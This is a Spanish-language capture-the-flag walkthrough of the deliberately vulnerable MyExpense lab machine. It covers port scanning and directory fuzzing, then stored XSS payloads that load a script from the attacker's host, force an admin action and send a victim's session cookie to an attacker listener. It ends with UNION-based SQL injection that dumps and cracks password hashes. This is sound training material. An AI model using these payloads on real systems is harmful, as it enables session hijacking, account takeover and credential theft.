

## Resolución 

Lo primero que vamos a hacer es configurar toda la maquina en virtual box para que esta maquina este en nuestra red
- Es simplemente en interfaz de red poner adaptador puente y wlo1 en mi caso 
- Ahora iniciamos la maquina

*Podemos usar el comando mkt para crear un entorno de carpetas para esta maquina*

## Reconocimiento

Primero que todo con el whichsistem.py comprobamos si estamos ante una maquina linux o windows
- En este caso nos reportara que la maquina es linux
```bash
whichSystem.py 192.168.1.30
```
Seguidamente aplicamos un reconocimiento con [[Nmap]]
```bash
nmap -p- --open -T5 -sS -min-rate 5000 -vvv -n -Pn -oG allPorts 192.168.1.30
```
Todo esto ira a un archivo llamado allPorts, con este comando podremos ver la información mas fácil mente
```bash
extractPorts allPorts
```
Ahora que sabemos cuales puertos están abiertos podemos mandar con [[Nmap]] un conjunto de scripts de reconocimiento para verificar si alguno tiene una vulnerabilidad
- El -sCV es para juntar el -sC y el -sV en uno
- El -oN es para que nos exporte el resultado a un archivo targeted
```bash
nmap -sCV -p80,51045,51193,54585,59179 192.168.1.30 -oN targeted
```
Ahora vamos a hacer fuzzing con [[Gobuster]] para descubrir los directorios y archivos de esta web
```bash
gobuster dir -u http://192.168.1.30 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```
Esto nos mostrara lo siguiente:

![1](</Writeups/Machines/MYEXPENSE/img/1.png>)

Este escaneo nos ha mostrado una serie de directorios bastante interesantes, como el /admin 

Nos vamos al /admin y con wapalicer podremos ver que la pagina usa [[PHP]] como lenguaje principal 

Sabiendo esto podemos volver a usar [[Gobuster]] para hacer un análisis al /admin en busca de algún archivo [[PHP]]
```bash
gobuster dir -u http://192.168.1.30/admin/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php
```
Esto nos reportara un archivo admin.php

![1](</Writeups/Machines/MYEXPENSE/img/2.png>)

Si nos metemos en este archivo podremos ver algunas credenciales

![1](</Writeups/Machines/MYEXPENSE/img/3.png>)

Ahora vamos a crear una cuenta, ciclamos en donde pone "no tienes una cuenta" y metemos las credenciales

Pero cuando vamos a crear la cuenta vemos que el botón esta desactivado

![1](</Writeups/Machines/MYEXPENSE/img/4.png>)

Por lo que vamos a irnos al modo inspección (cntrl + shift + c) y modificar el botón de desabilitado a habilitado 

![1](</Writeups/Machines/MYEXPENSE/img/5.png>)

Así podremos crear el usuario sin problemas 

## Explotación 

Ahora que hemos comprobado que se puede crear el usuario podemos intentar insertar código [[JavaScript]] al crear este usuario (para que al abrir el admin.php nos ejecute este código en el parámetro del nombre o del apellido)  

![1](</Writeups/Machines/MYEXPENSE/img/6.png>)

Ahora refescamos la pagina y comprobamos que efectivamente nos sale una alerta

![1](</Writeups/Machines/MYEXPENSE/img/7.png>)

Ahora vamos a comprobar que podemos recibir información:
- Primero abrimos un servidor HTTP por el puerto 80
```bash
python -m http.server 80
```
- Ahora creamos un usuario al que en vez de nombre y apellidos le insertamos este código:
```javascript
<script src="http://192.168.1.25/pwned.js"></script>
```
- Esto hará que el administrador este haciendo constantemente peticiones a nuestro servidor en el puerto 80 buscando el pwned.js

Una vez tenemos esto podemos crear el pwned.js, en este pondremos las instrucciones para que nos habilite el usuario que tenemos desabilitado

![1](</Writeups/Machines/MYEXPENSE/img/9.png>)

Si clicamos donde pone inactive veremos que tramita una petición para activar el usuario pero como no tenemos permisos no nos deja

Así que vamos a hacer que el pwned.js nos tramite la petición como el usuario admin cuando este lo ejecute:
```javascript
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.1.30/admin/admin.php?id=15&status=active');
request.send();
```
Esto hará que nos podamos conectar como Samuel ya que tenemos sus credenciales

Una vez que nos logeamos podemos ver como tienen un chat interno, y nos falta por tramitar la petición del pago.

Hacemos la petición del pago y ahora tenemos que conseguir un usuario con mas privilegios para aceptarlo 

Si nos fijamos nuestro superior es Manon, y tenemos un chat con el, asiq podremos colarle un XSS por el chat, que nos conecte a nuestra maquina pidiendo el pwned.js por el 4646

![1](</Writeups/Machines/MYEXPENSE/img/11.png>)

En el pwned.js pondremos el código que nos mandara la cookie de sesión de esta persona cuando entre al chat (en este caso es la pagina de inicio)
```javascript
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.1.25:4646/?cookie=' + document.cookie);
request.send();
```
Esto nos dará su cookie, ahora hay que sustituirla en nuestro navegador y aceptar el pago

![1](</Writeups/Machines/MYEXPENSE/img/12.png>)

Ahora que hemos validado el pago tenemos que aceptarlo, pero este usuario no tiene permisos suficientes, asiq vamos a hacernos con la cuenta del jefe de Manon el cual es un "Financial approver" por lo cual tendrá permisos para aceptar el tramite

Esta vez este usuario no mira el chat, por lo que va a ser difícil hacer un [[XSS]] 

Pero esta parte de la pagina es venerable a una [[SQL Injection]] por lo que o vamos a aprovechar

![1](</Writeups/Machines/MYEXPENSE/img/13.png>)

En esta parte de aquí es donde inyectaremos el código SQL

![1](</Writeups/Machines/MYEXPENSE/img/14.png>)

Iremos probando pero acabaremos viendo que la query interna de servidor, en la parte del id = 2 no tiene comillas 

Por lo que nos podemos aprovechar de esto para primero averiguar el numero de columnas que tiene (vamos probando hasta que no nos de error)
```python
?id = 2 order by 2
```
Sabiendo que tiene dos columnas podemos usar un union select para representar algunos datos
```python
?id = 2 union select 1,user()-- -
```

![1](</Writeups/Machines/MYEXPENSE/img/15.png>)

Ahora podremos usar lo mismo para listar las bases de datos existentes
```python
?id = 2 union select 1,schema_name from information_schema.schemata-- -
```

![1](</Writeups/Machines/MYEXPENSE/img/16.png>)

Ahora listamos las tablas de la base de datos myexpense

![1](</Writeups/Machines/MYEXPENSE/img/17.png>)

Y listamos las columnas de la tabla user

![1](</Writeups/Machines/MYEXPENSE/img/18.png>)

Ahora podemos listar la información de los campos username y password separados por dos puntos (0x3a)

![1](</Writeups/Machines/MYEXPENSE/img/19.png>)

Copiamos todo y lo ponemos mas legible en el terminal, se vería así:

![1](</Writeups/Machines/MYEXPENSE/img/20.png>)

Como las contraseñas están encriptadas podemos usar esta para para desencriptarlas --> https://hashes.com/en/decrypt/hash

![1](</Writeups/Machines/MYEXPENSE/img/21.png>)

Vemos que están encriptadas en [[MD5SUM]]

Probamos con la contraseña del financial aprover y es "HackMe"

![1](</Writeups/Machines/MYEXPENSE/img/22.png>)

Nos logeamos como el y aceptamos el importe

![1](</Writeups/Machines/MYEXPENSE/img/23.png>)

Una vez hecho esto nos podemos meter en la cuenta de Samuel y ver como nos dan la flag y el pedido esta completado ; )

![1](</Writeups/Machines/MYEXPENSE/img/24.png>)
